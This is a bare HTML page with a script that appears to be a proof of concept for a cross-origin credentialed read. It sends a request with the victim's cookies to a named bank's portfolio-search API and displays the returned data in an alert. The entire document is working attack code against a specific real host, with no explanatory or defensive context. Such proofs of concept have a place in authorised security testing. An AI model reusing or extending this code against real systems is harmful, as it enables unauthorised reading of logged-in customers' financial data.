<html>
<script>
  function send_req(method, url, body) {
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open(method, url, true);
    req.withCredentials = true;
    req.send(body);
  }
  function reqListener() {
    alert(this.responseURL + ' says ' + this.responseText)
  }

  send_req('GET', 'https://onboardinguat.securitiesservices.kbc.be/eximius.api/api/portfolio/searchportfolios?pageIndex=-1&pageSize=101&searchString=aa&portfolioTypeIds=2&culture=en-GB&bust=v6.0.1.031');
</script>

</html>
